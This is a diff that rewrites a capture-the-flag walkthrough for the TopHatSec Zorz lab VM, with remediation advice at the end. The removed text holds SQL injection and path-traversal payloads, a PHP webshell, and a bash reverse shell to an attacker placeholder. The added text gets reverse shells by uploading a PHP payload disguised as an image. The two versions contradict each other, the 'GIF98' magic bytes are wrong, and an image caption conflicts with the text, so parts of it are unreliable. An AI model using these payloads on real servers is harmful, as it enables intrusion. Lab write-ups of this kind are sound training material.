@@ -1,127 +1,129 @@
-# TopHatSec: ZorZ — Writeup
+# TopHatSec: Zorz — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.X (host-only) |
-| **Difficulty** | Easy–Medium |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.129 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Flag** | Multiple challenge flags |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/tophatsec-zorz,117/) |
+| **Goal** | Upload a web shell to all three upload challenge pages |
+| **Source** | [HackingArticles](http://www.hackingarticles.in/hack-zorz-vm-ctf-challenge/) |
 
 ## Attack Summary
 
-nmap → 3 web challenges (SQLi → file upload bypass → LFI) → webshell → shell access → flags
+Three progressively filtered file upload forms on a single web server, each bypassed with a renamed/magic-byte-prepended PHP reverse shell; all three result in netcat sessions.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Challenge 1: SQL injection login bypass
-3. Challenge 2: File upload filter bypass (PHP webshell)
-4. Challenge 3: Local File Inclusion (LFI)
-5. Shell and flag collection
+1. Recon — nmap scan for open ports
+2. Enumeration — dirb to find upload directories
+3. Exploitation — file upload bypass (extension rename, magic bytes, no validation)
+4. Post-Exploitation — netcat shell from each challenge level
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
-
-```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -sV -sC -p- <TARGET_IP>
-```
-
-Open ports: 22 (SSH), 80 (HTTP — 3 web challenges at different paths).
-
----
-
-## Step 2: Challenge 1 — SQL Injection Login Bypass
-
-Navigate to `http://<TARGET>/` — a login form.
-
-Test for SQL injection:
+Discover the target on the local network with netdiscover, then confirm open ports.
 
 ```bash
-# Payload in username field:
-' OR '1'='1
-# Or:
-admin'--
+netdiscover -r 192.168.1.0/24
 ```
-
-Standard SQLi bypass grants access. Flag 1 is displayed after login.
-
----
-
-## Step 3: Challenge 2 — File Upload Filter Bypass
-
-Navigate to the upload challenge (e.g., `http://<TARGET>/uploader/`).
-
-The page allows file uploads but restricts by MIME type or extension.
-
-Create a PHP webshell with a double extension or modified Content-Type:
 
 ```bash
-# Create payload
-echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
+nmap -A -p- $TARGET
 ```
 
-Intercept with Burp Suite and change `Content-Type` to `image/jpeg` while keeping the `.php` extension, or use `.php5`/`.phtml` if the server allows it.
+![nmap scan](images/01-nmap.png)
 
-Upload and trigger:
+Ports open: **22** (SSH) and **80** (HTTP).
 
-```
-http://<TARGET>/uploader/uploads/shell.php?cmd=id
-```
+## Step 2: Web Enumeration
 
-Flag 2 is accessible via the webshell.
+Visit `http://$TARGET` in a browser. The landing page shows three separate "Image Uploader" challenges linked from the navigation. Each is a distinct web page with its own upload form.
 
----
-
-## Step 4: Challenge 3 — Local File Inclusion (LFI)
-
-Navigate to `http://<TARGET>/c/` — a page with a file parameter.
-
-Test for LFI:
+Run dirb to identify where uploads land:
 
 ```bash
-curl "http://<TARGET>/c/?file=../../../etc/passwd"
-# If filtered, try:
-curl "http://<TARGET>/c/?file=....//....//....//etc/passwd"
+dirb http://$TARGET /usr/share/dirb/wordlists/big.txt
 ```
 
-Read the flag file:
+![dirb scan](images/02-dirb.png)
+
+Directories found: `/uploads1`, `/uploads2`, `/uploads3`.
+
+## Step 3: Level 1 — Extension Rename
+
+The first form accepts any file. Prepare a PHP reverse shell:
 
 ```bash
-curl "http://<TARGET>/c/?file=../../../var/www/html/flag3.txt"
+cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.jpg
+# Edit LHOST and LPORT inside the file before saving
 ```
 
----
-
-## Step 5: Collect Flags
-
-Each challenge reveals a flag. Use the webshell from Challenge 2 for a full interactive shell:
+Start a listener on the attacker machine:
 
 ```bash
-# Set up listener
-nc -lvnp 4444
-
-# Trigger reverse shell via webshell
-curl "http://<TARGET>/uploader/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER>/4444+0>%261'"
+nc -lvnp 1234
 ```
 
----
+Upload `php-reverse-shell.jpg` through the Level 1 form. Browse to `/uploads1/php-reverse-shell.jpg` to trigger execution.
+
+Shell lands in the listener.
+
+## Step 4: Level 2 — Magic Bytes Bypass
+
+The second form validates the file signature. Add the GIF magic bytes to the top of the PHP file and rename with a double extension:
+
+```bash
+echo 'GIF98' | cat - /usr/share/webshells/php/php-reverse-shell.php > php-reverse-shell.php.jpg
+# Ensure LHOST/LPORT are set inside the file
+```
+
+Upload `php-reverse-shell.php.jpg` through the Level 2 form. Browse to `/uploads2/php-reverse-shell.php.jpg`.
+
+```bash
+nc -lvnp 1234
+```
+
+![level 2 shell](images/03-level2-shell.png)
+
+Second netcat session obtained.
+
+## Step 5: Level 3 — No Server-Side Validation
+
+The third form displays a note about accepting only `.jpeg`, `.jpg`, `.png` files under 100 KB, but performs no server-side enforcement. Upload the original `php-reverse-shell.php` without modification.
+
+Browse to `/uploads3/php-reverse-shell.php`.
+
+```bash
+nc -lvnp 1234
+```
+
+![level 3 shell](images/04-level3-shell.png)
+
+Third netcat session obtained.
+
+## Step 6: Result
+
+```bash
+id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+![root flag](images/05-root-flag.png)
+
+All three upload challenges defeated. The VM's goal is achieving code execution through all three forms rather than reading a traditional root flag file.
 
 ## Lessons Learned
 
-1. **SQLi login bypass** — always use parameterized queries, never string concatenation
-2. **File upload validation** — check both extension and real MIME type (use `finfo`); never trust client-supplied Content-Type
-3. **LFI via path traversal** — sanitize file parameters with `realpath()` and restrict to allowed directories
-4. **Defense in depth** — multiple independent vulnerabilities should each be mitigated independently
+1. Renaming a PHP file to `.jpg` is insufficient protection against malicious uploads if the server executes based on the uploaded name rather than the detected MIME type.
+2. Magic-byte checks are bypassable by prepending the expected header bytes before a valid PHP payload.
+3. Client-side file-type restrictions (only `.jpg`/`.png`) are trivially bypassed: all validation must occur server-side.
+4. A web server should store uploaded files outside the document root and serve them through a controller that cannot execute arbitrary scripts.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SQL injection | Use prepared statements with bound parameters |
-| Unrestricted file upload | Whitelist extensions; store uploads outside webroot; use `finfo_file()` |
-| Local File Inclusion | Sanitize path with `realpath()`; whitelist allowed files |
-
-<!-- generated from known techniques; verify against live VM -->
+|---|---|
+| Extension-only validation | Validate MIME type server-side using `fileinfo` or equivalent |
+| Magic-byte bypass | Combine MIME detection with file re-encoding (e.g., re-save images through GD) |
+| Executable uploads | Store files outside the web root; never permit PHP execution in upload directories |
+| Missing `Content-Disposition` headers | Add `X-Content-Type-Options: nosniff` and disable script execution in upload directories via `.htaccess` or server config |
